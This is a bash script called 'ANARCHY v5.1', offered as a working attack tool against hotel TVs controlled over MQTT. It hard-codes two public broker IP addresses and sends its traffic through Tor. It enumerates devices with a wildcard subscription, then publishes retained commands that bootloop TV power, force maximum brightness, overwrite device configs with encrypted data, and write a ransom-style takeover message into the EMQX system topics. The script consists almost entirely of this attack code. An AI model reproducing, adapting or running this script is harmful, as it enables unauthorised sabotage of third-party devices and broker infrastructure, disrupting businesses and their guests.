#!/bin/bash
# ANARCHY v5.1 - FULL WILDCARD DISCOVERY + DUAL BROKER
set -euo pipefail

# DUAL BROKER SUPPORT
BROKERS=(
    "104.198.241.70:1883"
    "120.55.14.230:1883"
)

TOR="torsocks"
MAX_BRIGHT="255"
LOCKED_STATUS="LOCKED-TRUSTEDF57-ANARCHY-v5.1"
RANSOM_MSG="🔥 ANARCHY HOTEL TV TAKEOVER v5.1 🔥
TRUSTEDF57 - ALL HOTEL TVS COMPROMISED
POWER | BRIGHTNESS | CONTROL LOCKED"

# DYNAMIC DISCOVERY
discover_targets() {
    local host_port=$1
    echo "[🔍] DISCOVERING TARGETS su ${host_port}..."
    
    ${TOR} mosquitto_sub -h ${host_port/:/ -p } -t "#" -C 1 | \
    grep -i "Hotel/Tv/" | \
    cut -d'/' -f3 | \
    sort -u > hotel_tvs_${host_port//:/_}.txt
    
    wc -l hotel_tvs_${host_port//:/_}.txt
}

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY-V51-DUAL" 2>/dev/null | sed 's/=//g'
}

TOR_PUB_BROKER() {
    local host_port=$1 topic=$2 payload=$3 qos=2
    [[ $# -eq 4 ]] && qos=$4
    ${TOR} mosquitto_pub -h ${host_port/:/ -p } -r -q ${qos} -t "$topic" -m "$payload"
}

# DYNAMIC TV ARRAY LOAD
load_tvs() {
    mapfile -t HOTEL_TVS < hotel_tvs_${HOST_PORT//:/_}.txt
    echo "[📺] Loaded ${#HOTEL_TVS[@]} TVs da ${HOST_PORT}"
}

show_menu() {
    clear
    cat << EOF
┌─ ANARCHY v5.1 - ${HOST_PORT} (${#HOTEL_TVS[@]:-0} TVs) ─────┐
│ 1) 🔍 FULL WILDCARD DISCOVERY (#)                    │
│ 2) 📺 FORCE ALL TVs ONLINE                           │
│ 3) 🔄 TV POWER BOOTLOOP (ALL)                        │
│ 4) 💡 MAX BRIGHTNESS 255 (ALL)                       │
│ 5) 📡 EMQX BROKER RANSOM                             │
│ 6) 🔒 HOTEL TVS FULL LOCKDOWN                        │
│ 7) ⚙️ SYS BROKER OVERWRITE                           │
│ 8) 🔐 ALL TV CONFIGS ENCRYPTED                       │
│ 9) 🎪 TOTAL HOTEL ANARCHY v5.1                       │
│ S) 🔄 SWITCH BROKER (${BROKER_INDEX}/${#BROKERS[@]})│
│ 0) ❌ EXIT                                           │
└──────────────────────────────────────────────────────┘
EOF
}

full_discovery() {
    discover_targets "${HOST_PORT}"
    load_tvs
}

force_all_tvs_online() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ No TVs loaded! Run discovery first"; return; }
    echo "[📺] Force ${#HOTEL_TVS[@]} TVs ONLINE..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}" "ONLINE-LOCKED-TRUSTEDF57" 1
    done
    echo "✅ ${#HOTEL_TVS[@]} TVs forced online"
}

tv_power_bootloop_all() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ No TVs! Discovery first"; return; }
    echo "[🔄] BOOTLOOP ${#HOTEL_TVS[@]} TVs..."
    bootloop="POWER1 1;Delay 800;POWER1 0;Delay 400;POWER1 1;Delay 1500;POWER1 0;LOOP"
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/POWER" "BOOTLOOP-START"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/CMND" "${bootloop}"
    done
    echo "✅ Bootloop ${#HOTEL_TVS[@]} TVs"
}

max_brightness_all() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ No TVs!"; return; }
    echo "[💡] MAX 255 ${#HOTEL_TVS[@]} TVs..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/POWER" "1"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/BRIGHTNESS" "${MAX_BRIGHT}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}" "MAX-BRIGHT-LOCKED"
    done
    echo "✅ ${#HOTEL_TVS[@]} max brightness"
}

emqx_ransom() {
    echo "[📡] RANSOM ${HOST_PORT}..."
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "${RANSOM_MSG}"
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers/emqx@127.0.0.1/version" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers" "ANARCHY-v5.1-CONTROLLED"
    echo "✅ Broker ransomed"
}

hotel_tvs_lockdown() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ No TVs!"; return; }
    echo "[🔒] LOCKDOWN ${#HOTEL_TVS[@]} TVs..."
    locked_data="{\"status\":\"${LOCKED_STATUS}\",\"brightness\":${MAX_BRIGHT},\"power\":\"1\"}"
    crypt_data=$(ENCRYPT_PAYLOAD "${locked_data}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}" "${LOCKED_STATUS}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/status" "${crypt_data}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/config" "${crypt_data}"
    done
    echo "✅ ${#HOTEL_TVS[@]} LOCKED"
}

sys_broker_overwrite() {
    echo "[⚙️] SYS OVERWRITE ${HOST_PORT}..."
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "ANARCHY-EMQX-LOCKED-v5.1"
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "${HOST_PORT}" "\$SYS/brokers/emqx@127.0.0.1/version" "5.1-COMPROMISED"
    echo "✅ Sys overwritten"
}

all_configs_encrypted() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ No TVs!"; return; }
    echo "[🔐] ENCRYPT ${#HOTEL_TVS[@]} TV CONFIGS..."
    encrypt_payload="{\"v\":\"5.1\",\"status\":\"ENCRYPTED\",\"control\":\"BLOCKED\"}"
    crypt_payload=$(ENCRYPT_PAYLOAD "${encrypt_payload}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/config" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/status" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/power" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST_PORT}" "Hotel/Tv/${tv}/brightness" "${crypt_payload}"
    done
    echo "✅ ${#HOTEL_TVS[@]} FULLY ENCRYPTED"
}

total_anarchy_v51() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { echo "❌ Discovery first!"; return; }
    echo "🎪 TOTAL ANARCHY v5.1 - ${#HOTEL_TVS[@]} TVs..."
    force_all_tvs_online
    sleep 2
    tv_power_bootloop_all
    sleep 2
    max_brightness_all
    sleep 2
    emqx_ransom
    sleep 2
    hotel_tvs_lockdown
    sleep 2
    sys_broker_overwrite
    sleep 2
    all_configs_encrypted
    echo "🎉 TOTAL ANARCHY COMPLETE - ${#HOTEL_TVS[@]} TVs!"
}

switch_broker() {
    BROKER_INDEX=$(( (BROKER_INDEX + 1) % ${#BROKERS[@]} ))
    HOST_PORT="${BROKERS[$BROKER_INDEX]}"
    if [[ -f "hotel_tvs_${HOST_PORT//:/_}.txt" ]]; then
        load_tvs
    fi
    echo "🔄 Switched to ${HOST_PORT}"
}

# MAIN LOOP
BROKER_INDEX=0
HOST_PORT="${BROKERS[0]}"

while true; do
    show_menu
    read -r CHOICE </dev/tty
    case "${CHOICE}" in
        1) full_discovery ;;
        2) force_all_tvs_online ;;
        3) tv_power_bootloop_all ;;
        4) max_brightness_all ;;
        5) emqx_ransom ;;
        6) hotel_tvs_lockdown ;;
        7) sys_broker_overwrite ;;
        8) all_configs_encrypted ;;
        9) total_anarchy_v51 ;;
        S|s) switch_broker ;;
        0) echo "[+] EXIT"; exit 0 ;;
        *) echo "❌ Invalid: ${CHOICE}" ;;
    esac
    echo
    read -r -p "⏸️  ENTER to continue..." </dev/tty
done
